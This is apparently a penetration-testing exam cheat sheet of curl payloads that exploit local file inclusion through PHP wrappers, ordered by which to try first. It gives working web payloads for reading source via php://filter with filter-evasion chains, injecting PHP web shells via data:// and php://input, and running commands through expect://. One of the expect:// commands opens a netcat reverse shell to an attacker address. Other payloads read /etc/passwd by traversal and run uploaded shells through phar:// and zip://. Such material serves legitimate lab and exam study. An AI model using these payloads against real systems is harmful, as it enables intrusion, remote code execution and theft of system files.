# LFI & PHP Wrappers

## Quick Examples

```bash
curl http://192.168.0.0/index.php?page=php://filter/read=string.rot13/resource=index.php
curl http://192.168.0.0/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
curl http://192.168.0.0/index.php?page=php://filter/convert.base64-encode/resource=index.php
curl http://192.168.0.0/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php

curl http://192.168.0.0/index.php?page=php://filter/convert.base64-encode/resource=admin.php  # return base64 encoded page
curl "http://192.168.0.0/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
curl "http://192.168.0.0/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```

---

## Exam Priority Order (what to try first → last)

1. `php://filter/convert.base64-encode/resource=<file>` ⭐⭐⭐
2. `data://text/plain;base64,…` (if `allow_url_include` On)
3. `expect://id`
4. `php://input` + POST payload
5. `phar://` or `zip://` (after upload)

---

## 1. php://filter ⭐⭐⭐ — Most Important for Reading Source

```bash
# Basic base64 encode (use this first 90% of the time)
curl "http://10.10.10.10/index.php?page=php://filter/convert.base64-encode/resource=index.php"

# Double encode (bypass weak filters)
curl "http://10.10.10.10/index.php?page=php://filter/convert.base64-encode|convert.base64-encode/resource=index.php"

# rot13 (sometimes the only one that works)
curl "http://10.10.10.10/index.php?page=php://filter/read=string.rot13/resource=index.php"

# Huge filter chain bypass (WAF/blacklist evasion)
curl "http://10.10.10.10/index.php?page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-encode/resource=admin.php"

# Case bypass
curl "http://10.10.10.10/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php"
```

## 2. data:// ⭐⭐⭐ — Instant RCE if allow_url_include = On

First create your base64 payload (do this once in your exam VM):

```bash
echo -n '<?php system($_GET["cmd"]); ?>' | base64
# Output: PD9waHAgc3lzdGVtKCRfR0VUW1wiY21kXCJdKTsgPz4=
```

Then use:

```bash
# Basic data stream RCE
curl "http://10.10.10.10/index.php?page=data://text/plain,<?php%20system('id');?>"

# Base64 data stream (bypasses most filters)
curl "http://10.10.10.10/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW1wiY21kXCJdKTsgPz4=&cmd=id"

# With comma bypass
curl "http://10.10.10.10/index.php?page=data://text/plain,,<?php%20system('cat /etc/passwd');?>"
```

## 3. expect:// ⭐⭐ — Rare but Instant Win if Enabled

```bash
curl "http://10.10.10.10/index.php?page=expect://id"
curl "http://10.10.10.10/index.php?page=expect://whoami"
curl "http://10.10.10.10/index.php?page=expect://cat /etc/passwd"
curl "http://10.10.10.10/index.php?page=expect://nc -e /bin/sh 10.10.14.X 443"
```

## 4. php://input ⭐⭐ — RCE When POST is Allowed

```bash
curl -X POST --data '<?php system("id"); ?>' "http://10.10.10.10/index.php?page=php://input"
curl -X POST --data '<?php system($_GET["cmd"]); ?>' "http://10.10.10.10/index.php?page=php://input&cmd=whoami"
```

## 5. phar:// ⭐⭐ — When You Can Upload a ZIP/JPG

```bash
# Assuming you uploaded evil.jpg containing shell.php
curl "http://10.10.10.10/index.php?page=phar://./uploads/evil.jpg/shell.php"
curl "http://10.10.10.10/index.php?page=phar://./uploads/evil.jpg/shell.php?cmd=id"
```

## 6. zip:// — Older Version of phar://

```bash
curl "http://10.10.10.10/index.php?page=zip://uploads/evil.zip%23shell.php"
curl "http://10.10.10.10/index.php?page=zip://evil.jpg%23shell.php"
```

## 7. file:// — Almost Never Works but Try Anyway

```bash
curl "http://10.10.10.10/index.php?page=file:///etc/passwd"
```

## 8. Wrapper Nesting / Advanced Bypasses

```bash
# php://filter + data:// nesting
curl "http://10.10.10.10/index.php?page=php://filter/resource=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW1wiY21kXCJdKTsgPz4="

# php://filter + php://input
curl -X POST --data '<?php system("id"); ?>' "http://10.10.10.10/index.php?page=php://filter/resource=php://input"
```

## 9. Null Byte & Truncation (Old PHP Versions)

```bash
curl "http://10.10.10.10/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd%00"
curl "http://10.10.10.10/index.php?page=../../../../etc/passwd%00"
# Truncation: 4000+ characters then %00
```
